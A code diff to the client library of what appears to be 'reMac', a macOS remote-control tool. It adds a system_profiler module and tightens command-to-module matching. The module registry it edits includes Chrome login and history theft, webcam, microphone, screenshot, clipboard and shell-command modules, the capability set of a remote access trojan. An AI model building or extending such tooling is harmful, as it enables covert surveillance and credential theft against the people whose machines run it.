@@ -1,6 +1,4 @@
 import json
-import os
-import base64
 from apps.libs.reMac_libbase import reMac_libbase
 from apps.client.modules.mod_client_clipboard import mod_client_clipboard
 from apps.client.modules.mod_client_hello import mod_client_hello
@@ -16,24 +14,7 @@ from apps.client.modules.mod_client_download import mod_client_download
 from apps.client.modules.mod_client_upload import mod_client_upload
 from apps.client.modules.mod_client_help import mod_client_help
 from apps.client.modules.mod_client_video import mod_client_video
-
-# global reMacClientModules
-# reMacClientModules = [
-#     mod_client_hello(),
-#     mod_client_clipboard(),
-#     mod_client_recmic(),
-#     mod_client_module_help(),
-#     mod_client_info(),
-#     mod_client_chrome_login(),
-#     mod_client_chrome_history(),
-#     mod_client_screenshot(),
-#     mod_client_webcam(),
-#     mod_client_shellcmd(),
-#     mod_client_download(),
-#     mod_client_upload(),
-#     mod_client_video(),
-#     mod_client_help()
-# ]
+from apps.client.modules.mod_client_system_profiler import mod_client_system_profiler
 
 
 class reMac_libclient(reMac_libbase):
@@ -54,7 +35,8 @@ class reMac_libclient(reMac_libbase):
         mod_client_download(),
         mod_client_upload(),
         mod_client_video(),
-        mod_client_help()
+        mod_client_help(),
+        mod_client_system_profiler()
     ]
     prg = None
 
@@ -98,8 +80,9 @@ class reMac_libclient(reMac_libbase):
                 self._send_buffer = self._send_buffer[sent:]
 
     def getModule4Cmd(self, cmd):
+        args = cmd.split(" ", 1)
         for md in self.reMacModules:
-            if md.cmd_short.startswith(cmd) or md.cmd_long.startswith(cmd):
+            if md.cmd_short.startswith(args[0]) or md.cmd_long == args[0]:
                 return md
         return None
 
